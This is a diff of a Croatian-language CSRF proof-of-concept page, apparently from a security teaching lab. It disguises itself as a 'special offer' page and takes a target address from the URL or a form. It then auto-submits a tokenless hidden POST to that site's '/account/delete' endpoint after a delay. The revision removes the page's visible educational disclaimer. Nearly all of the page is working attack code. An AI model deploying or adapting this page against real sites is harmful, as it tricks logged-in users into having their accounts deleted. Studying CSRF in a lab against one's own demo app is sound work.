@@ -1,94 +1,157 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="hr">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Posebna ponuda</title>
-  <style>
-    * { box-sizing: border-box; }
-    body { margin: 0; min-height: 100vh; display: grid; place-items: center; padding: 24px; background: #f3f5f9; color: #202536; font-family: Arial, sans-serif; }
-    main { width: min(520px, 100%); padding: 30px; border: 1px solid #e2e6ef; border-radius: 14px; background: white; box-shadow: 0 8px 30px rgba(25,35,60,.08); }
-    .tag { color: #6875b3; font-size: 12px; font-weight: 700; letter-spacing: 1.3px; text-transform: uppercase; }
-    h1 { margin: 10px 0; font-size: 28px; }
-    p { color: #626b7b; line-height: 1.6; }
-    .status { margin: 18px 0; padding: 13px; border-radius: 8px; background: #f4f6fc; color: #4e5b87; }
-    button { padding: 12px 18px; border: 0; border-radius: 8px; background: #a43e48; color: white; font-weight: 700; cursor: pointer; }
-    button:hover { background: #87323b; }
-    .small { font-size: 12px; color: #858c99; }
-    .error { color: #8c2929; background: #fff0f0; }
-    #targetForm { display: none; margin-top: 16px; }
-    input { width: 100%; margin: 6px 0 12px; padding: 10px; border: 1px solid #cbd2df; border-radius: 7px; }
-  </style>
-</head>
-<body>
-  <main>
-    <p class="tag">Dobrodošli</p>
-    <h1>Preuzmi svoju posebnu ponudu!</h1>
-    <p>Stranica učitava ponudu. Molimo pričekaj trenutak.</p>
-    <div id="status" class="status" role="status">Priprema zahtjeva…</div>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Posebna ponuda</title>
 
-    <form id="attackForm" method="POST">
-      <!-- Namjerno nema csrfToken polja: to simulira zahtjev koji je sastavio napadač. -->
-      <input type="hidden" name="source" value="external-attacker-page">
-      <button type="submit" id="sendButton">Pošalji zahtjev</button>
-    </form>
-
-    <form id="targetForm">
-      <label for="targetInput">Adresa demonstracijske aplikacije</label>
-      <input id="targetInput" type="url" placeholder="https://moja-aplikacija.onrender.com" required>
-      <button type="submit">Postavi adresu</button>
-    </form>
-    <p class="small">Edukacijska demonstracija CSRF napada. Zahtjev pokušava obrisati račun trenutačno prijavljenog korisnika u ciljnoj aplikaciji.</p>
-  </main>
-
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const statusBox = document.getElementById("status");
-    const form = document.getElementById("attackForm");
-    const targetForm = document.getElementById("targetForm");
-    const targetInput = document.getElementById("targetInput");
-    const sendButton = document.getElementById("sendButton");
-
-    function startAttack(value) {
-      let target;
-      try {
-        target = new URL(value);
-      } catch {
-        statusBox.textContent = "Adresa aplikacije nije valjana.";
-        statusBox.classList.add("error");
-        return;
+    <style>
+      body {
+        margin: 0;
+        padding: 30px;
+        font-family: Arial, sans-serif;
+        background: #f5f5f5;
+        color: #222;
       }
 
-      if (target.protocol !== "http:" && target.protocol !== "https:") {
-        statusBox.textContent = "Dopuštene su samo HTTP i HTTPS adrese.";
-        statusBox.classList.add("error");
-        return;
+      main {
+        max-width: 450px;
+        margin: 80px auto;
+        padding: 25px;
+        background: white;
+        border: 1px solid #ddd;
       }
 
-      form.action = new URL("/account/delete", target.origin).toString();
-      statusBox.textContent = "Lažni POST zahtjev za brisanje računa bit će poslan za 2 sekunde…";
-      sendButton.hidden = false;
+      h1 {
+        font-size: 24px;
+      }
 
-      window.setTimeout(() => {
-        if (form.isConnected) form.requestSubmit();
-      }, 2000);
-    }
+      p {
+        line-height: 1.5;
+      }
 
-    const target = params.get("target");
-    if (target) {
-      startAttack(target);
-    } else {
-      statusBox.textContent = "Nedostaje adresa ciljne aplikacije. Unesi je za nastavak.";
-      targetForm.style.display = "block";
-      form.style.display = "none";
-    }
+      .status {
+        margin: 20px 0;
+        padding: 12px;
+        background: #eee;
+      }
 
-    targetForm.addEventListener("submit", (event) => {
-      event.preventDefault();
-      form.style.display = "block";
-      targetForm.style.display = "none";
-      startAttack(targetInput.value);
-    });
-  </script>
-</body>
+      button {
+        padding: 10px 16px;
+        border: none;
+        background: #444;
+        color: white;
+        cursor: pointer;
+      }
+
+      button:hover {
+        background: #222;
+      }
+
+      #targetForm {
+        display: none;
+        margin-top: 15px;
+      }
+
+      input {
+        width: 100%;
+        padding: 10px;
+        margin: 8px 0 12px;
+        box-sizing: border-box;
+      }
+
+      .error {
+        color: red;
+      }
+    </style>
+  </head>
+
+  <body>
+    <main>
+      <h1>Preuzmi svoju posebnu ponudu!</h1>
+
+      <div id="status" class="status" role="status">Priprema zahtjeva…</div>
+
+      <!-- post forma za napad -->
+      <form id="attackForm" method="POST">
+        <input type="hidden" name="source" value="external-attacker-page" />
+        <button type="submit" id="sendButton">Pošalji zahtjev</button>
+      </form>
+
+      <!-- ako nedostaje adresa -->
+      <form id="targetForm">
+        <label for="targetInput"> Adresa demonstracijske aplikacije </label>
+
+        <input
+          id="targetInput"
+          type="url"
+          placeholder="https://moja-aplikacija.onrender.com"
+          required
+        />
+
+        <button type="submit">Postavi adresu</button>
+      </form>
+    </main>
+
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const statusBox = document.getElementById("status");
+      const form = document.getElementById("attackForm");
+      const targetForm = document.getElementById("targetForm");
+      const targetInput = document.getElementById("targetInput");
+      const sendButton = document.getElementById("sendButton");
+
+      function startAttack(value) {
+        let target;
+
+        try {
+          target = new URL(value);
+        } catch {
+          statusBox.textContent = "Adresa aplikacije nije valjana.";
+          statusBox.classList.add("error");
+          return;
+        }
+
+        if (target.protocol !== "http:" && target.protocol !== "https:") {
+          statusBox.textContent = "Dopuštene su samo HTTP i HTTPS adrese.";
+          statusBox.classList.add("error");
+          return;
+        }
+
+        // ruza za brisanje racuna aplikacije
+        form.action = new URL("/account/delete", target.origin).toString();
+
+        statusBox.textContent =
+          "Lažni POST zahtjev za brisanje računa bit će poslan za 7 sekundi…";
+
+        sendButton.hidden = false;
+
+        // automatski posalji zahtjev nakon 7 sekundi
+        window.setTimeout(() => {
+          if (form.isConnected) form.requestSubmit();
+        }, 7000);
+      }
+
+      const target = params.get("target");
+
+      if (target) {
+        startAttack(target);
+      } else {
+        statusBox.textContent =
+          "Nedostaje adresa ciljne aplikacije. Unesi je za nastavak.";
+
+        targetForm.style.display = "block";
+        form.style.display = "none";
+      }
+
+      targetForm.addEventListener("submit", (event) => {
+        event.preventDefault();
+
+        form.style.display = "block";
+        targetForm.style.display = "none";
+
+        startAttack(targetInput.value);
+      });
+    </script>
+  </body>
 </html>
